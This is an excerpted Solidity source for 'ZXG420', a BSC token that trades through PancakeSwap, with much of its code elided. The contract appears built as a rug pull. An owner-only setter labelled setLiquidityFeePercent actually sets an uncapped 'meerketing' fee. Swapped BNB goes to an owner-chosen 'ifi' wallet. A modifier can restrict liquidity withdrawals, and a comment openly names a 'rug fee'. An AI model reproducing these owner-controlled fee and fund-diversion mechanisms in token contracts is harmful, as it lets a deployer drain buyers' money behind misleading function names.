...
Telegram : https://t.me/NutZillaBSC
...
contract ZXG420 is Context, IERC20, Ownable {
    ...
    string private _name = "ZXG420";
    string private _symbol = "Z420";
    uint8 private _decimals = 9;

    uint256 public _taxFee = 5;
    uint256 private _previousTaxFee = _taxFee;

    uint256 public _meerketingFee = 5;
    uint256 private _previousMeerketingFee = _meerketingFee;
    ...
    // The last amount of LP tokens in the BNB/RETH pair
    ...
    uint256 private numTokensSellToAddToSwap = 500000 * 10**6 * 10**9;

    event MinTokensBeforeSwapUpdated(uint256 minTokensBeforeSwap);
    event SwapAndSendEnabledUpdated(bool enabled);
    event SwapAndSend(uint256 tokensInContract);
    ...
    constructor() {
        ...
        IUniswapV2Router02 _pancakeV2Router =
        ...
        // Set the default ifi strategy as the owner
        ifi = owner();
    ...
    modifier forbidLiquidityWithdrawals(address _from, address _to) {
        uint256 _LPSupplyOfPairTotal = IERC20(pancakeV2Pair).totalSupply();
    ...
    function setLiquidityFeePercent(uint256 meerketingFee) external onlyOwner {
        _meerketingFee = meerketingFee;
    }

    function setifi(address _owner) external onlyOwner {
        ifi = _owner;
    }

    function setMaxPercentTx(uint256 maxTxPercent) external onlyOwner {
    ...
    function calculateLiquidityFee(uint256 _amount)
        ...
        returns (uint256)
    {
        return (_amount * _meerketingFee) / 10**2;
    }

    function removeAllFee() private {
        if (_taxFee == 0 && _meerketingFee == 0) return;

        _previousTaxFee = _taxFee;
        _previousMeerketingFee = _meerketingFee;
    ...
    function restoreAllFee() private {
        ...
        _meerketingFee = _previousMeerketingFee;
    }
    ...
    function _transfer(
        ...
        bool overMinTokenBalance =
            contractTokenBalance >= numTokensSellToAddToSwap;
        if (
            overMinTokenBalance &&
            !inSwapAndSend &&
            from != pancakeV2Pair &&
        ...
        // Transfer amount, it will take tax, burn and rug fee
        _tokenTransfer(from, to, amount, takeFee);
    }

    function swapAndSend(uint256 contractTokenBalance) private lockTheSwap {
        swapTokensForBnb(contractTokenBalance);
        emit SwapAndSend(contractTokenBalance);
    }
    ...
    function swapTokensForBnb(uint256 tokenAmount) private {
        ...
        pancakeV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            ...
            path,
            ifi, // send BNB directly to the ifi 
            block.timestamp
        );
    }
